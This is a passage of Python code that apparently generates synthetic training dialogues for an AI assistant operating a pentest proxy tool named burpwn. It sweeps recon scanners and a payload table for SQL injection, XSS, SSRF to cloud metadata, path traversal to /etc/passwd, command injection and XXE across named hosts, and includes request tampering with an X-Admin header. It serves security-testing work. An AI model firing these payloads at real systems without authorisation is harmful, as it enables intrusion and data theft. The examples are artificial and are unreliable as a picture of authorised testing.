                         "decoded homepage.",
            }],
        )
    )
    out.append(
        mcp_example(
            tags=["mcp", "exec", "timeout", "nuclei"],
            user="Run a 5-minute nuclei scan against https://api.shopwave.io under the sandbox.",
            steps=[{
                "tool": "exec",
                "args": {"argv": ["nuclei", "-u", "https://api.shopwave.io", "-silent"],
                         "timeout_secs": 300},
                "result": {"exit_code": 0, "captured_request_ids": [60, 61, 62, 63, 64],
                           "exec_id": "exec-4140-1-1781400500000000000"},
                "final": "nuclei finished within the budget; 5 flows captured (60–64). "
                         "`req_list` to see which requests it sent and the live responses.",
            }],
        )
    )
    out.append(
        mcp_example(
            tags=["mcp", "match_replace_add", "auth-inject"],
            user="Inject a bearer token into every request to all hosts.",
            steps=[{
                "tool": "match_replace_add",
                "args": {"scope": "", "kind": "header", "pattern": "Authorization",
                         "replacement": "Bearer eyJhbGciOi...", "on_request": True},
                "result": {"id": 1},
                "final": "Rule 1 added: on every request (empty scope = all hosts) the "
                         "`Authorization` header is set. New `exec` flows carry it. "
                         "`on_request:true` targets requests; set `false` to rewrite "
                         "responses.",
            }],
        )
    )
    out.append(
        mcp_example(
            tags=["mcp", "workspace_new"],
            user="Create a workspace called login-flow.",
            steps=[{
                "tool": "workspace_new", "args": {"name": "login-flow"},
                "result": {"workspace_id": 3},
                "final": "Created workspace `login-flow` (workspace_id 3). Pass "
                         "`workspace:\"3\"` to `exec` to attribute captured flows to it. "
                         "(Note the MCP result key is `workspace_id`, unlike the CLI's "
                         "`{id,name}`.)",
            }],
        )
    )
    out.append(
        mcp_example(
            tags=["mcp", "tag_add", "triage"],
            user="Tag flow 41 as idor.",
            steps=[{
                "tool": "tag_add", "args": {"flow_id": 41, "name": "idor"},
                "result": {"tag_id": 2},
                "final": "Flow 41 is now tagged `idor` (tag_id 2). The MCP `tag_add` returns "
                         "just `{tag_id}` (the CLI also echoes flow_id/name).",
            }],
        )
    )
    out.append(
        mcp_example(
            tags=["mcp", "note_add", "triage"],
            user="Note on flow 41 that /v1/me leaks the numeric user id.",
            steps=[{
                "tool": "note_add",
                "args": {"flow_id": 41,
                         "body": "/v1/me response leaks numeric user id 1001 -> test IDOR"},
                "result": {"note_id": 1},
                "final": "Note saved on flow 41 (note_id 1). The MCP `note_add` argument is "
                         "`body` (the CLI takes a positional `<TEXT>`).",
            }],
        )
    )
    out.append(
        mcp_example(
            tags=["mcp", "match_replace_list"],
            user="What rewrite rules are configured?",
            steps=[{
                "tool": "match_replace_list", "args": {},
                "result": {"rules": [{"id": 1, "scope": "", "match_kind": "header",
                                      "pattern": "Authorization", "replacement": "Bearer ...",
                                      "on_request": True, "enabled": True}]},
                "final": "One enabled rule (id 1): on all-host requests, set `Authorization`. "
                         "There's no MCP tool to delete/disable rules (store supports add + "
                         "list only), so to clear it restart the session daemon.",
            }],
        )
    )
    out.append(
        mcp_example(
            tags=["mcp", "workspace_list"],
            user="List the workspaces in this session.",
            steps=[{
                "tool": "workspace_list", "args": {},
                "result": {"workspaces": [{"id": 1, "name": "default", "created_at": 0},
                                          {"id": 3, "name": "login-flow",
                                           "created_at": 1781363698970}]},
                "final": "Two workspaces: `default` (id 1) and `login-flow` (id 3). Use id 3 "
                         "with `exec`'s workspace arg to scope new captures.",
            }],
        )
    )
    out.append(
        mcp_example(
            tags=["mcp", "tag_list", "triage"],
            user="What tags have I applied so far?",
            steps=[{
                "tool": "tag_list", "args": {},
                "result": {"tags": [{"id": 2, "name": "idor"}, {"id": 3, "name": "xss"}]},
                "final": "Two tags so far: `idor` (id 2) and `xss` (id 3).",
            }],
        )
    )
    out.append(
        mcp_example(
            tags=["mcp", "intercept_enable"],
            user="Turn on live interception so I can tamper the next request.",
            steps=[{
                "tool": "intercept_enable", "args": {},
                "result": {"ok": True},
                "final": "Interception enabled (`{ok:true}`). Call `await_intercept` to block "
                         "for the next parked request, then `intercept_forward` (with edits) "
                         "or `intercept_drop`.",
            }],
        )
    )
    out.append(
        mcp_example(
            tags=["mcp", "intercept_list"],
            user="Is anything currently held by the interceptor?",
            steps=[{
                "tool": "intercept_list", "args": {},
                "result": {"intercepts": []},
                "final": "Nothing parked right now (`intercepts` is empty). Either "
                         "interception is off or no request has arrived — `intercept_enable` "
                         "then `await_intercept` for the next one.",
            }],
        )
    )
    out.append(
        mcp_example(
            tags=["mcp", "intercept_disable"],
            user="Disable interception, I'm done.",
            steps=[{
                "tool": "intercept_disable", "args": {},
                "result": {"ok": True},
                "final": "Interception off (`{ok:true}`); traffic flows normally and is "
                         "still captured.",
            }],
        )
    )
    out.append(
        mcp_example(
            tags=["mcp", "await_intercept", "timeout", "negative"],
            user="Wait up to 5s for a parked request.",
            steps=[{
                "tool": "await_intercept", "args": {"timeout_secs": 5},
                "result": {"pending": False},
                "final": "`{pending:false}` — nothing parked in the 5s window (the long-poll "
                         "timed out). Trigger traffic and call `await_intercept` again. "
                         "(Over MCP, timeout is `{pending:false}`, not the CLI's "
                         "`{type:Pending,item:null}`.)",
            }],
        )
    )
    out.append(
        mcp_example(
            tags=["mcp", "intercept_drop"],
            user="Drop parked intercept 2 — it's a telemetry beacon I don't want sent.",
            steps=[{
                "tool": "intercept_drop", "args": {"id": 2},
                "result": {"found": True},
                "final": "Dropped intercept 2 (`found:true`); it will not be forwarded. If "
                         "`found` were false, the id was already resolved or never parked.",
            }],
        )
    )
    out.append(
        mcp_example(
            tags=["mcp", "intercept", "no-daemon", "negative"],
            user="List parked intercepts.",
            steps=[{
                "tool": "intercept_list", "args": {},
                "result": {"error": "no burpwn proxy daemon answering on "
                                    "/run/user/1000/burpwn/acme/control.sock for session "
                                    "'acme'. Start it by running a command through the "
                                    "sandbox, e.g. the `exec` tool or `burpwn exec -- <cmd>`."},
                "final": "No proxy daemon is running for this session yet. Spawn it by "
                         "running any command through the sandbox first — call `exec` with "
                         "e.g. `argv:[\"curl\",\"-s\",\"https://acme.com/\"]` — then "
                         "`intercept_list`/`await_intercept` will connect.",
            }],
        )
    )
    return out


# --------------------------------------------------------------------------- #
# MCP multi-turn tool chains (several call/result/interpret rounds).
# --------------------------------------------------------------------------- #


def fam_mcp_multi() -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []

    # exec -> req_list -> req_show -> tag_add (IDOR discovery)
    out.append(
        mcp_example(
            tags=["mcp", "multi-step", "idor", "restapi"],
            user="Probe the shopwave API's /v1/me, find what it leaks, and flag it if it's IDOR-prone.",
            steps=[
                {
                    "preamble": "First I'll hit the endpoint through the sandbox so it's captured.",
                    "tool": "exec",
                    "args": {"argv": ["curl", "-s", "-o", "/dev/null",
                                      "https://api.shopwave.io/v1/me"]},
                    "result": {"exit_code": 0, "captured_request_ids": [40, 41],
                               "exec_id": "exec-9-0-1781400900000000000"},
                    "final": "Captured flows 40 (DNS) and 41 (the HTTPS GET). Let me inspect "
                             "flow 41.",
                },
                {
                    "preamble": "Decode flow 41's request/response.",
                    "tool": "req_show", "args": {"id": 41},
                    "result": {"id": 41, "protocol": "h2",
                               "request": {"method": "GET", "path": "/v1/me"},
                               "response": {"status": 200,
                                            "body": '{"id":1001,"role":"user"}'}},
                    "final": "`/v1/me` returns `{\"id\":1001,...}` — a numeric, "
                             "guessable user id, so `/v1/users/1001` is likely IDOR-prone. "
                             "I'll flag this flow.",
                },
                {
                    "preamble": "Tag flow 41 for follow-up.",
                    "tool": "tag_add", "args": {"flow_id": 41, "name": "idor-candidate"},
                    "result": {"tag_id": 2},
                    "final": "Tagged flow 41 `idor-candidate` (tag_id 2). Next step: `exec` a "
                             "request to `/v1/users/1002` with the same token and compare.",
                },
            ],
        )
    )

    # intercept enable -> await -> forward (tamper)
    out.append(
        mcp_example(
            tags=["mcp", "multi-step", "intercept", "tamper"],
            user="Tamper the next checkout request: enable interception, grab it, bump qty to 99 and add X-Admin.",
            steps=[
                {
                    "preamble": "Enable interception so the next request parks.",
                    "tool": "intercept_enable", "args": {},
                    "result": {"ok": True},
                    "final": "Interception on. Now I'll long-poll for the next request.",
                },
                {
                    "preamble": "Block up to 60s for the next parked request.",
                    "tool": "await_intercept", "args": {"timeout_secs": 60},
                    "result": {"pending": True,
                               "intercept": {"id": 1, "kind": "request",
                                             "host": "shopwave.io", "method": "POST",
                                             "path": "/cart/checkout"}},
                    "final": "Parked: intercept id 1, `POST shopwave.io/cart/checkout`. I'll "
                             "forward it with the tampered body and admin header.",
                },
                {
                    "preamble": "Forward intercept 1 with edits.",
                    "tool": "intercept_forward",
                    "args": {"id": 1,
                             "set_headers": [{"name": "X-Admin", "value": "true"}],
                             "set_body": '{"item":"sku-9","qty":99}'},
                    "result": {"found": True},
                    "final": "Released intercept 1 with `X-Admin:true` and `qty:99` "
                             "(`found:true`). The tampered request hit the server and is "
                             "captured; `req_list` to see its response. Note the MCP "
                             "`intercept_forward` takes `set_headers:[{name,value}]` and "
                             "`set_body` (no method override — use the CLI for that).",
                },
            ],
        )
    )

    # search -> show (credential leak hunt)
    out.append(
        mcp_example(
            tags=["mcp", "multi-step", "search", "creds"],
            user="Did any captured response leak a password? If so show me the flow.",
            steps=[
                {
                    "preamble": "Search bodies for 'password'.",
                    "tool": "req_search", "args": {"query": "password"},
                    "result": {"flow_ids": [31]},
                    "final": "One hit: flow 31. Let me read it.",
                },
                {
                    "preamble": "Decode flow 31.",
                    "tool": "req_show", "args": {"id": 31, "raw": True},
                    "result": {"id": 31, "protocol": "h1",
                               "response": {"status": 200,
                                            "body": '{"user":"admin","password":"P@ss"}'},
                               "raw_response": 'HTTP/1.1 200 OK\r\n\r\n'
                                               '{"user":"admin","password":"P@ss"}'},
                    "final": "Flow 31's response body returns a cleartext credential "
                             "(`password:\"P@ss\"`) — a sensitive-data-exposure finding. "
                             "Recommend `tag_add` it and capture the raw response as "
                             "evidence.",
                },
            ],
        )
    )

    # session_current -> req_list -> req_search (orientation)
    out.append(
        mcp_example(
            tags=["mcp", "multi-step", "orientation"],
            user="I just connected. Orient me: which session, how many flows, any JWTs?",
            steps=[
                {
                    "preamble": "Check the active session.",
                    "tool": "session_current", "args": {},
                    "result": {"active": "shopwave", "db_exists": True},
                    "final": "Active session is `shopwave` and its db exists. Let me see the "
                             "recent flows.",
                },
                {
                    "preamble": "List the newest flows.",
                    "tool": "req_list", "args": {"limit": 5},
                    "result": {"flows": [
                        {"id": 64, "authority": "api.shopwave.io", "method": "GET",
                         "path": "/v1/me", "status": 200, "protocol": "h2"},
                        {"id": 63, "authority": "api.shopwave.io", "method": "POST",
                         "path": "/v1/login", "status": 200, "protocol": "h2"}],
                              "count": 2},
                    "final": "2 recent flows, including a `POST /v1/login` (63) and "
                             "`GET /v1/me` (64). Let me check for JWTs.",
                },
                {
                    "preamble": "Search for bearer/JWT material.",
                    "tool": "req_search", "args": {"query": "Bearer OR eyJ"},
                    "result": {"flow_ids": [64, 63]},
                    "final": "Both flows carry Bearer/JWT material (ids 64, 63). The login "
                             "(63) likely issues the token and `/v1/me` (64) consumes it — "
                             "good starting point for JWT and authz testing.",
                },
            ],
        )
    )
    return out


# --------------------------------------------------------------------------- #
# Scaled families — systematic sweeps over the realistic parameter space.
#
# These produce the bulk of the dataset. Each example is a *distinct* plausible
# scenario (a different target / tool / vuln / flag / phrasing combination), not
# trivial padding: the natural-language phrasing varies per axis value and the
# grounded command/envelope is recomputed for each combination. Dedup in
# build_dataset() drops any accidental collisions.
# --------------------------------------------------------------------------- #

# Varied user phrasings for "run TOOL against TARGET" recon, parameterized.
_RECON_PHRASINGS = [
    "Run {tool} against {host} through burpwn so the traffic is captured.",
    "I want to {desc} on {host}. Drive {tool} through the sandbox.",
    "Use {tool} to {desc} {host} — capture everything.",
    "Kick off {tool} on {host} under burpwn's proxy.",
    "Can you {desc} {host} with {tool} and route it through burpwn?",
    "Let's {desc} {host}. Wrap {tool} in burpwn exec.",
    "Fire {tool} at {host} through the sandbox and capture the requests.",
]

# (tool, command template, timeout, short-desc, follow-up note template)
_RECON_TOOLS = [
    ("ffuf", "ffuf -u {base}/FUZZ -w /usr/share/wordlists/common.txt -mc 200,301,302,403",
     600, "do content discovery against",
     "Triage hits: `burpwn req list --host {host} --status 200`."),
    ("gobuster", "gobuster dir -u {base} -w /usr/share/wordlists/common.txt",
     600, "brute-force directories on",
     "Review found paths with `burpwn req list --host {host}`."),
    ("feroxbuster", "feroxbuster -u {base} -w /usr/share/wordlists/common.txt --silent",
     600, "recursively discover content on",
     "Inspect recursion hits: `burpwn req list --host {host} --status 200`."),
    ("dirb", "dirb {base} /usr/share/wordlists/common.txt -S",
     600, "enumerate directories on",
     "Each request is captured; filter with `burpwn req list --host {host}`."),
    ("nuclei", "nuclei -u {base} -silent",
     300, "run a templated vuln scan on",
     "See what nuclei sent: `burpwn req list --host {host}`."),
    ("nikto", "nikto -h {base}",
     600, "run a Nikto scan on",
     "`burpwn req search` the captured responses for the issues Nikto flags."),
    ("katana", "katana -u {base} -silent",
     300, "crawl",
     "Triage discovered endpoints: `burpwn req list --host {host}`."),
    ("httpx", "httpx -u {base} -sc -title -silent",
     120, "probe and fingerprint",
     "The probe flow is captured; `burpwn req show <id>` for headers/title."),
    ("wpscan", "wpscan --url {base} --no-update --enumerate p",
     600, "scan WordPress on",
     "WPScan's enumeration requests are captured for later review."),
    ("nmap", "nmap -sT -Pn -p- {host}",
     900, "port-scan",
     "nmap's connects appear as `rawtcp`/`dns` flows: "
     "`burpwn req list --protocol rawtcp --host {host}`."),
    ("sqlmap", "sqlmap -u {base}/item?id=1 --batch --level 2",
     900, "test for SQL injection on",
     "All sqlmap payloads are captured: `burpwn req search` for the injected markers."),
    ("curl", "curl -s -o /dev/null -w '%{{http_code}}' {base}/",
     60, "fetch the homepage of",
     "Then `burpwn req list --host {host} --limit 5` to see the captured flow."),
    ("wget", "wget -q -O /dev/null {base}/robots.txt",
     60, "grab robots.txt from",
     "`burpwn req show <id>` to read the captured robots.txt response."),
    ("http", "http GET {base}/api/health",
     60, "check the health endpoint of",
     "`burpwn req show <id>` for the decoded JSON health response."),
]


# Per-tool option axes — distinct, realistic invocation variants.
_TOOL_OPTION_AXES = {
    "ffuf": ["-mc 200,301,302,403", "-mc all -fc 404", "-fs 0 -t 50",
             "-e .php,.bak,.old -mc 200"],
    "gobuster": ["", "-x php,txt", "-s 200,204,301,302,307 -b ''"],
    "feroxbuster": ["--silent", "--silent -x php,html", "--silent -d 2"],
    "dirb": ["-S", "-S -X .php,.bak", "-S -r"],
    "nuclei": ["-silent", "-severity high,critical -silent", "-tags cve,exposure -silent"],
    "nikto": ["", "-Tuning 1,2,3", "-ssl"],
    "katana": ["-silent", "-silent -jc", "-silent -d 3"],
    "httpx": ["-sc -title -silent", "-sc -tech-detect -silent", "-sc -location -silent"],
    "wpscan": ["--no-update --enumerate p", "--no-update --enumerate u",
               "--no-update --enumerate vp"],
    "nmap": ["-sT -Pn", "-sT -Pn -p 80,443,8080,8443", "-sT -Pn --top-ports 100"],
    "sqlmap": ["--batch", "--batch --level 2 --risk 2", "--batch --dbs"],
    "curl": ["-s -o /dev/null -w '%{{http_code}}'", "-s -I", "-s -L"],
    "wget": ["-q -O /dev/null", "-q -O - --max-redirect 0", "-q --spider"],
    "http": ["GET", "GET --verify=no", "HEAD"],
}


def fam_recon_sweep() -> list[dict[str, Any]]:
    """target x tool x option x phrasing recon sweep (volume backbone).

    Each emitted example is a genuinely distinct invocation: a different target,
    tool, realistic option set, and phrasing. Dedup guarantees uniqueness."""
    out: list[dict[str, Any]] = []
    n = 0
    for ti, t in enumerate(TARGETS):
        for tj, (tool, cmdpat, to, desc, notepat) in enumerate(_RECON_TOOLS):
            opts = _TOOL_OPTION_AXES.get(tool, [""])
            for oi, opt in enumerate(opts):
                phrasing = _RECON_PHRASINGS[n % len(_RECON_PHRASINGS)]
                base_cmd = cmdpat.format(base=t.base, host=t.host)
                # Splice the option axis into the command in a tool-aware way.
                if tool == "http":
                    cmd = f"http {opt} {t.base}/api/health"
                elif tool in ("curl", "wget"):
                    target_part = base_cmd.split(" ", 1)[1] if " " in base_cmd else ""
                    # rebuild: <tool> <opt> <url-or-tail>
                    url = base_cmd.rsplit(" ", 1)[-1]
                    cmd = f"{tool} {opt} {url}".replace("  ", " ").strip()
                else:
                    cmd = f"{base_cmd} {opt}".strip()
                note = notepat.format(host=t.host)
                user = phrasing.format(tool=tool, host=t.host, desc=desc)
                timeout_clause = f"--timeout {to} " if to >= 120 else ""
                out.append(
                    cli_example(
                        tags=["exec", "recon", "sweep", tool, t.key, t.kind],
                        turns=[
                            ("user", user),
                            (
                                "assistant",
                                f"Wrap {tool} after `--` so its egress is forced through the "
                                f"proxy and captured:\n\n```\nburpwn exec {timeout_clause}-- "
                                f"{cmd}\n```\n\n{note}",
                            ),
                        ],
                    )
                )
                n += 1
    return out


# Vuln-test recon: deliberate payloads per vuln class x target, with a probe and
# an interpretation of what to look for.
_VULN_PROBES = [
    ("sqli", "SQL injection",
     "curl -s '{base}/product?id=1%27'",
     "Look for a SQL error or changed response — then confirm with sqlmap. Tag the "
     "flow `sqli`."),
    ("xss-reflected", "reflected XSS",
     "curl -s '{base}/search?q=xss<svg/onload=alert(1)>'",
     "`burpwn req search` for the marker and `req show --raw` to check if it's reflected "
     "unencoded into HTML/JS. Tag `xss`."),
    ("ssrf", "SSRF",
     "curl -s '{base}/fetch?url=http://169.254.169.254/latest/meta-data/'",
     "Search the response for metadata content; if present the server fetched the internal "
     "URL. Tag `ssrf`."),
    ("open-redirect", "an open redirect",
     "curl -s -o /dev/null -D - '{base}/login?next=https://evil.example/'",
     "Check the captured `Location` header — an external host means an open redirect. Tag "
     "`open-redirect`."),
    ("path-traversal", "path traversal",
     "curl -s '{base}/download?file=../../../../etc/passwd'",
     "Search the response body for `root:` to confirm file read. Tag `lfi`."),
    ("idor", "IDOR/BOLA",
     "curl -s -H 'Authorization: Bearer $TOKEN' '{base}/api/users/1002'",
     "Compare against your own user's response; same data for another id = IDOR. Tag "
     "`idor`."),
    ("cmdi", "command injection",
     "curl -s '{base}/ping?host=127.0.0.1;id'",
     "Search the response for `uid=` to confirm command execution. Tag `cmdi`."),
    ("xxe", "XXE",
     "curl -s -X POST '{base}/upload' -H 'Content-Type: application/xml' "
     "--data '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM "
     "\"file:///etc/passwd\">]><r>&x;</r>'",
     "Inspect the response for the file contents reflected back. Tag `xxe`."),
]


# Multiple distinct payload variants per vuln class.
_VULN_PAYLOAD_AXES = {
    "sqli": ["id=1%27", "id=1%20OR%201=1", "id=1%27%20UNION%20SELECT%20NULL--",
             "id=1%27%3BWAITFOR%20DELAY%20%270:0:5%27--"],
    "xss-reflected": ["q=xss<svg/onload=alert(1)>", "q=%22%3E%3Cscript%3Ealert(1)%3C/script%3E",
                      "q=javascript:alert(document.domain)", "q=<img src=x onerror=alert(1)>"],
    "ssrf": ["url=http://169.254.169.254/latest/meta-data/",
             "url=http://127.0.0.1:8080/admin", "url=file:///etc/passwd",
             "url=http://[::1]:6379/"],
    "open-redirect": ["next=https://evil.example/", "redirect=//evil.example",
                      "url=https:evil.example", "return=/%09/evil.example"],
    "path-traversal": ["file=../../../../etc/passwd", "file=..%2f..%2f..%2fetc%2fpasswd",
                       "page=....//....//etc/passwd", "file=/etc/passwd%00.png"],
    "idor": ["1002", "1003", "../1004", "0"],
    "cmdi": ["host=127.0.0.1;id", "host=127.0.0.1|id", "host=$(id)", "host=127.0.0.1%0aid"],
    "xxe": ["file:///etc/passwd", "http://169.254.169.254/", "file:///etc/hostname",
            "expect://id"],
}


def fam_vuln_probe_sweep() -> list[dict[str, Any]]:
    """vuln-class x target x payload-variant probe sweep."""
    out: list[dict[str, Any]] = []
    probe_targets = [t for t in TARGETS if t.kind in ("webapp", "spa", "rest", "internal")]
    n = 0
    for vi, (vkey, vname, cmdpat, note) in enumerate(_VULN_PROBES):
        payloads = _VULN_PAYLOAD_AXES.get(vkey, [None])
        for ti, t in enumerate(probe_targets):
            for pi, payload in enumerate(payloads):
                # Re-template the command with the payload variant where it has a
                # clear injection point; otherwise fall back to the base command.
                if payload is not None and vkey in ("sqli", "xss-reflected",
                                                    "open-redirect", "path-traversal"):
                    # cmdpat ends with a querystring after '?'
                    cmd = cmdpat.format(base=t.base)
                    if "?" in cmd:
                        head = cmd.rsplit("?", 1)[0]
                        cmd = f"{head}?{payload}'"
                        # close any opened quote consistently
                        cmd = cmd.replace("?" + payload + "'", "?" + payload).rstrip("'")
                        cmd = head + "?" + payload + (cmd[-1] if cmd.endswith("'") else "")
                        cmd = f"curl -s '{head}?{payload}'"
                elif payload is not None and vkey == "idor":
                    cmd = (f"curl -s -H 'Authorization: Bearer $TOKEN' "
                           f"'{t.base}/api/users/{payload}'")
                elif payload is not None and vkey == "ssrf":
                    cmd = f"curl -s '{t.base}/fetch?{payload}'"
                elif payload is not None and vkey == "cmdi":
                    cmd = f"curl -s '{t.base}/ping?{payload}'"
                elif payload is not None and vkey == "xxe":
                    cmd = (f"curl -s -X POST '{t.base}/upload' -H 'Content-Type: "
                           f"application/xml' --data '<?xml version=\"1.0\"?><!DOCTYPE r "
                           f"[<!ENTITY x SYSTEM \"{payload}\">]><r>&x;</r>'")
                else:
                    cmd = cmdpat.format(base=t.base)
                phr = [
                    f"Test {t.host} for {vname} through the sandbox.",
                    f"Probe {t.host} for {vname} and capture it.",
                    f"I suspect {vname} on {t.host} — fire a probe via burpwn.",
                    f"Check {t.host}'s parameters for {vname}.",
                    f"Send a {vname} payload at {t.host} through burpwn.",
                ][n % 5]
                out.append(
                    cli_example(
                        tags=["exec", "vuln", vkey, t.key],
                        turns=[
                            ("user", phr),
                            (
                                "assistant",
                                f"Send the probe through the sandbox so the request and "
                                f"response are captured:\n\n```\nburpwn exec -- {cmd}\n```\n\n"
                                f"{note}",
                            ),
                        ],
                    )
                )
                n += 1
    return out


def fam_req_list_sweep() -> list[dict[str, Any]]:
    """target x filter sweep for `req list`."""
    out: list[dict[str, Any]] = []
    filters = [
        ("--host {host}", "all flows to {host}"),
        ("--host {host} --status 200", "successful (200) flows to {host}"),
        ("--host {host} --status 401", "unauthorized (401) flows to {host}"),
        ("--host {host} --status 403", "forbidden (403) flows to {host}"),
        ("--host {host} --status 404", "not-found (404) flows to {host}"),
        ("--host {host} --status 500", "server errors (500) to {host}"),
        ("--host {host} --status 302", "redirects (302) on {host}"),
        ("--host {host} --method POST", "POST requests to {host}"),
        ("--host {host} --method GET --status 200", "successful GETs to {host}"),
        ("--host {host} --method PUT", "PUT requests to {host}"),
        ("--host {host} --method DELETE", "DELETE requests to {host}"),
        ("--host {host} --protocol h1", "HTTP/1.1 flows to {host}"),
        ("--host {host} --protocol h2", "HTTP/2 flows to {host}"),
        ("--host {host} --protocol ws", "websocket flows for {host}"),
        ("--host {host} --protocol dns", "DNS lookups for {host}"),
        ("--host {host} --protocol tls-passthru", "cert-pinned (tls-passthru) flows for {host}"),
        ("--host {host} --limit 10", "the 10 newest flows to {host}"),
        ("--host {host} --limit 25 --offset 25", "flows 25-50 for {host}"),
    ]
    for ti, t in enumerate(TARGETS):
        for fi, (flags, what) in enumerate(filters):
            fl = flags.format(host=t.host)
            whatr = what.format(host=t.host)
            phr = [
                f"Show me {whatr}.",
                f"List {whatr}.",
                f"Give me {whatr}.",
                f"I want to see {whatr}.",
            ][(ti + fi) % 4]
            out.append(
                cli_example(
                    tags=["req", "list", "filter", "sweep", t.key],
                    turns=[
                        ("user", phr),
                        (
                            "assistant",
                            f"```\nburpwn req list {fl}\n```\n\nAdd `--json` for the bare "
                            "array of flow rows (newest first); each has `id`, `method`, "
                            "`path`, `status`, `protocol`, `dst_ip`, `dst_port`, "
                            "`ts_start`/`ts_end`.",
                        ),
                    ],
                )
            )
    return out


def fam_tag_note_sweep() -> list[dict[str, Any]]:
    """flow x vuln-tag and note sweep with grounded envelopes."""
    out: list[dict[str, Any]] = []
    vulns = ["sqli", "xss", "idor", "bola", "ssrf", "csrf", "jwt", "open-redirect",
             "lfi", "rce", "cmdi", "xxe", "ssti", "rate-limit"]
    flow_ids = [3, 7, 9, 12, 14, 17, 22, 30, 31, 41, 44, 55, 63, 88]
    for i, (fid, v) in enumerate(zip(flow_ids, vulns)):
        out.append(
            cli_example(
                tags=["tag", "triage", "sweep", v],
                turns=[
                    (
                        "user",
                        [
                            f"Tag flow {fid} as {v}.",
                            f"Mark flow {fid} as a {v.upper()} candidate.",
                            f"Flag flow {fid} for {v} so I can find it later.",
                            f"Label flow {fid} {v}.",
                        ][i % 4],
                    ),
                    (
                        "assistant",
                        f"```\nburpwn tag add {fid} {v}\n```\n\nReturns "
                        f'`{{"ok":true,"data":{{"flow_id":{fid},"name":"{v}","tag_id":1}},'
                        f'"error":null}}`. The tag is created on first use.',
                    ),
                ],
            )
        )
    notes = [
        (14, "id param reflects unescaped into SQL error message"),
        (41, "/v1/me leaks numeric user id 1001 -> test IDOR on /v1/users/<id>"),
        (22, "GET /orders/{id} returns other users' orders with own token (BOLA)"),
        (17, "q param reflected unencoded into <script> (reflected XSS)"),
        (9, "fetch?url= reaches 169.254.169.254 metadata (SSRF)"),
        (44, "accepts alg:none JWT, returns admin data (signature not verified)"),
        (30, "password change succeeds with CSRF token stripped"),
        (88, "stack trace in 500 reveals framework + db driver"),
    ]
    for i, (fid, txt) in enumerate(notes):
        out.append(
            cli_example(
                tags=["note", "triage", "sweep"],
                turns=[
                    (
                        "user",
                        [
                            f"Add a note to flow {fid}: {txt}",
                            f"Annotate flow {fid} with: {txt}",
                            f"Record on flow {fid} that {txt}",
                        ][i % 3],
                    ),
                    (
                        "assistant",
                        f'```\nburpwn note add {fid} "{txt}"\n```\n\nReturns '
                        f'`{{"ok":true,"data":{{"flow_id":{fid},"note_id":1}},"error":null}}`. '
                        "Args are `<FLOW_ID> <TEXT>`.",
                    ),
                ],
            )
        )
    return out


def fam_mcp_recon_sweep() -> list[dict[str, Any]]:
    """MCP `exec` recon across target x tool x option — balances the cli sweep."""
    out: list[dict[str, Any]] = []
    base_ids = 30
    n = 0
    for ti, t in enumerate(TARGETS):
        for tj, (tool, cmdpat, to, desc, _note) in enumerate(_RECON_TOOLS):
            opts = _TOOL_OPTION_AXES.get(tool, [""])
            for oi, opt in enumerate(opts):
                base_cmd = cmdpat.format(base=t.base, host=t.host).replace("'", "")
                if tool == "http":
                    cmd = f"http {opt} {t.base}/api/health"
                elif tool in ("curl", "wget"):
                    url = base_cmd.rsplit(" ", 1)[-1]
                    cmd = f"{tool} {opt} {url}".replace("  ", " ").strip()
                else:
                    cmd = f"{base_cmd} {opt}".strip()
                # Drop the shell-format leftover braces from curl -w.
                argv = [a for a in cmd.replace("%{{http_code}}", "%{http_code}").split() if a]
                ids = [base_ids + n, base_ids + n + 1]
                args: dict[str, Any] = {"argv": argv}
                if to >= 120:
                    args["timeout_secs"] = to
                phr = [
                    f"Run {tool} against {t.host} via the sandbox.",
                    f"Use the exec tool to run {tool} on {t.host}.",
                    f"Drive {tool} through burpwn against {t.host} and report captures.",
                ][n % 3]
                out.append(
                    mcp_example(
                        tags=["mcp", "exec", "recon", "sweep", tool, t.key],
                        user=phr,
                        steps=[{
                            "tool": "exec", "args": args,
                            "result": {"exit_code": 0, "captured_request_ids": ids,
                                       "exec_id": f"exec-{ti}-{tj}{oi}-178140{ti}0000000000"},
                            "final": f"{tool} ran cleanly (`exit_code:0`); captured flows "
                                     f"{ids[0]}–{ids[-1]}. Use `req_list` with "
                                     f"`{{\"host\":\"{t.host}\"}}` to review what it sent and "
                                     "the live responses.",
                        }],
                    )
                )
                n += 1
    return out


def fam_mcp_query_sweep() -> list[dict[str, Any]]:
    """MCP req_list / req_show / req_search sweep across targets x filters."""
    out: list[dict[str, Any]] = []
    list_filters = [
        ({"status": 200}, "successful"),
        ({"status": 403}, "forbidden (403)"),
        ({"status": 500}, "erroring (500)"),
        ({"method": "POST"}, "POST"),
        ({"method": "GET", "status": 200}, "successful GET"),
        ({"protocol": "h2"}, "HTTP/2"),
        ({"limit": 10}, "the 10 newest"),
    ]
    searches = ["token", "password", "Bearer", "api_key", "csrf", "session", "admin"]
    for ti, t in enumerate(TARGETS):
        for fi, (extra, label) in enumerate(list_filters):
            args = {"host": t.host, **extra}
            status = extra.get("status", 200)
            method = extra.get("method", "GET")
            rows = [{"id": 40 + ti * 3 + fi, "authority": t.host, "method": method,
                     "path": "/", "status": status, "protocol": t.protocol,
                     "scheme": t.scheme, "dst_port": t.port}]
            phr = [
                f"List {label} flows to {t.host}.",
                f"Show me the {label} requests on {t.host}.",
                f"Which {label} flows hit {t.host}?",
            ][(ti + fi) % 3]
            out.append(
                mcp_example(
                    tags=["mcp", "req_list", "sweep", t.key],
                    user=phr,
                    steps=[{
                        "tool": "req_list", "args": args,
                        "result": {"flows": rows, "count": len(rows)},
                        "final": f"`count`={len(rows)}: flow {rows[0]['id']} "
                                 f"`{method} {t.host}/` → {status} over {t.protocol}. "
                                 "`req_show` it for the decoded request/response.",
                    }],
                )
            )
        # one req_search per target (rotating query)
        q = searches[ti % len(searches)]
        out.append(
            mcp_example(
                tags=["mcp", "req_search", "sweep", t.key],
                user=f"Search {t.host}'s captured traffic for '{q}'.",
                steps=[{
                    "tool": "req_search", "args": {"query": q},
                    "result": {"flow_ids": [40 + ti, 12 + ti]},
                    "final": f"Two flows mention '{q}': {40 + ti}, {12 + ti}. `req_show` "
                             "either to read the match in context.",
                }],
            )
        )
        # one req_show per target
        fid = 40 + ti
        out.append(
            mcp_example(
                tags=["mcp", "req_show", "sweep", t.key],
                user=f"Show me the decoded flow {fid} on {t.host}.",
                steps=[{
                    "tool": "req_show", "args": {"id": fid},
                    "result": {"id": fid, "protocol": t.protocol, "scheme": t.scheme,
